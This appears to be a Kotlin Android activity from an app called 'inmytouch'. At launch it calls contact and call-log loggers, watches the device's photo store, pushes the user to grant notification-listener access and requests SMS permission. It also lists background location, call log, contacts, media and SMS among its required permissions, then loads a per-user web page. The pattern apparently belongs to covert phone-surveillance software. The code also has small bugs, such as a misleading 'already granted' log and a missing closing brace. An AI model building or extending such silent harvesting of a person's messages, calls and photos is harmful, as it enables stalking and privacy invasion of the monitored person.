package com.imt.inmytouch
import android.Manifest
import android.app.Activity
import android.content.ContentResolver
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.graphics.Bitmap
import android.os.Bundle
import android.os.Handler
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.Toolbar
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.imt.inmytouch.data.CallLogger
import com.imt.inmytouch.data.ContactLogger
import com.imt.inmytouch.data.NotificationLogger

class HomeActivity : AppCompatActivity() {

    private val SMS_PERMISSION_REQUEST_CODE = 123


    lateinit var webView: WebView
    lateinit var imageObserver: ImageObserver;
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_home)

        val userID=intent!!.getIntExtra("userID" ,0)

        val notificationListenerPermission = "com.imt.inmytouch"

        if (!Settings.Secure.getString(contentResolver, "enabled_notification_listeners").contains(notificationListenerPermission)) {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            startActivity(intent)
        }

        // Register the observer
        val contactLogger = ContactLogger()
        contactLogger.logContacts(this)

        val callLogger = CallLogger()

        callLogger.logCalls(this)

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            // Request the permission
            Log.d("Sms","already granted")
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.RECEIVE_SMS),
                SMS_PERMISSION_REQUEST_CODE)
        } else {
            Log.d("Sms","already granted")
            // The app already has the RECEIVE_SMS permission
            // Handle SMS-related functionality here
        }

        val contentResolver: ContentResolver = contentResolver
        imageObserver = ImageObserver(this, Handler())
        contentResolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true,
            imageObserver as ContentObserver)
                    // Set up the WebView
        webView= findViewById(R.id.webView)
        val progressBar: ProgressBar = findViewById(R.id.progressBar)

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true // Enable JavaScript
        webSettings.domStorageEnabled = true // Enable local storage

        // Set up WebView clients
        val webViewClient = MyWebViewClient(progressBar, this@HomeActivity) { newUrl ->
            // Handle the new URL here
            // Add your custom logic based on the new URL
        }
        webView.webViewClient = webViewClient
        webView.webChromeClient = MyWebChromeClient(progressBar)

        // Load the URL
        val url = "$END_POINT${userID}"
        Log.d("userID",userID.toString())
        webView.loadUrl(url)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == SMS_PERMISSION_REQUEST_CODE) {
            // Check if the permission was granted
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // The user granted the RECEIVE_SMS permission
                // Handle SMS-related functionality here
            } else {
                // The user denied the permission
                // Handle the case where the app can't receive SMS messages
            }
        }
    }

    // Custom WebViewClient to handle page navigation
    private class MyWebViewClient(
        private val progressBar: ProgressBar,
        private val activity: Activity,
        private val onPageChangeListener: (String) -> Unit
    ) : WebViewClient() {

        override fun onPageStarted(view: WebView?, url: String?, favicon: Bitmap?) {
            progressBar.visibility = View.VISIBLE
            if (url!!.contains("logout")) {
                activity.finish()
            }
            super.onPageStarted(view, url, favicon)
        }

        override fun onPageFinished(view: WebView?, url: String?) {
            progressBar.visibility = View.INVISIBLE
            if(url!!.contains("logout")){
                activity.finish()
                val sharedPreferences=activity.getSharedPreferences("sharedp", MODE_PRIVATE)
                sharedPreferences.edit().clear().apply()
                activity.startActivity(Intent(activity,MainActivity::class.java))
            }
            super.onPageFinished(view, url)
        }

        override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
        ): Boolean {
            val newUrl = request?.url.toString()
            onPageChangeListener.invoke(newUrl)
            view?.loadUrl(newUrl)
            return true
        }
    }

    // Custom WebChromeClient to handle progress updates
    private class MyWebChromeClient(private val progressBar: ProgressBar) : WebChromeClient() {
        override fun onProgressChanged(view: WebView?, newProgress: Int) {
            progressBar.progress = newProgress
            super.onProgressChanged(view, newProgress)
        }
    }

    override fun onBackPressed() {
        if(webView.canGoBack()){
            webView.goBack()
        }else {
            super.onBackPressed()
        }
    }

    private fun checkAndRequestPermissions() {
        val requiredPermissions = arrayOf(
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            android.Manifest.permission.INTERNET,
            android.Manifest.permission.ACCESS_NETWORK_STATE,
            android.Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.RECEIVE_SMS
        )

        val notGrantedPermissions = mutableListOf<String>()

        for (permission in requiredPermissions) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                notGrantedPermissions.add(permission)
            }
        }

        if (notGrantedPermissions.isNotEmpty()) {
            // Open PermissionActivity if any permission is not granted
            startActivity(Intent(this, PermissionActivity::class.java))
            finish()
        } else {
            // All permissions are granted, continue with your normal flow
            // For example, call a method to initialize your app features
        }
}
